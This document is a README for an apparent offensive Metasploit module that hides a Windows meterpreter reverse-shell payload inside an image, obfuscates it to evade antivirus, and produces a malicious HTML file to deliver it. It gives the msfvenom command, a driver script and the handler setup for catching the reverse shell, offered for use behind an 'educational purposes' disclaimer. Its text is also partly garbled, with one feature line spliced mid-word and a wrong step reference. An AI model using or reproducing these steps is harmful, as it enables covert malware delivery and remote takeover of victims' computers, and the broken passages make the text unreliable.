# Embedded Image Payload Module

This project demonstrates how to create a Metasploit module that embeds a payload into an image file and generates a malicious HTML file to execute the payload on a target machine.
## Features

- Embeds a payload into an image file using steganography techniques
- Encrypts the payload using XOR encryption with a random key
- Applies polymorphic techniques to obfuscate the payload and evade antivirus detection
- Generates a malicious HTML file that extracts and e- Sets up a Metasploit handler to receive the reverse shell connection

## Requirements

- Ruby programming language
- Metasploit framework

## Basic Install (see INSTALL for more info)

1. Clone the repository:
`git clone https://github.com/your-username/embedded-image-payload.git`

2. Install the required dependencies:
`bundle install`

## Creating the payload and handler

1. Generate a Metasploit payload using msfvenom. For this example, let's generate a Windows reverse shell payload. Open a terminal and run the following command:

   ```rb
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -f exe -o payload.exe
   ```

   Replace `YOUR_IP` with your local IP address or the IP address of the machine where you want to receive the reverse shell connection.

2. Create a new file named `exploit.rb` in the project directory and add the following code:

   ```rb
   # exploit.rb
   require_relative 'module'
   require_relative 'payload'

   module_options = {
     'IMAGE_PATH' => 'image.jpg',
     'OUTPUT_PATH' => 'malicious.html'
   }

   module_instance = MetasploitModule.new(module_options)
   module_instance.exploit

   original_payload = File.binread('payload.exe')
   image_path = 'image.jpg'
   generate_payload(original_payload, image_path)
   ```

3. Open a new terminal window and start a Metasploit listener to catch the reverse shell connection. Run the following commands:

   ```rb
   msfconsole
   use exploit/multi/handler
   set PAYLOAD windows/meterpreter/reverse_tcp
   set LHOST YOUR_IP
   set LPORT 4444
   run
   ```

   Replace `YOUR_IP` with the same IP address you used in step 4.

4. In the first terminal window, run the `exploit.rb` script:

   ```rb
   ruby exploit.rb
   ```

   This will embed the payload into the `image.jpg` file and generate a malicious HTML file named `malicious.html`.


## Disclaimer

This project is intended for educational and research purposes only. The authors and contributors are not responsible for any misuse or damage caused by this project. Use it at your own risk and ensure that you have proper authorization before using it in any real-world scenarios.

Remember to replace **YOUR_IP** with the actual IP address of your machine where you want to receive the reverse shell connection.

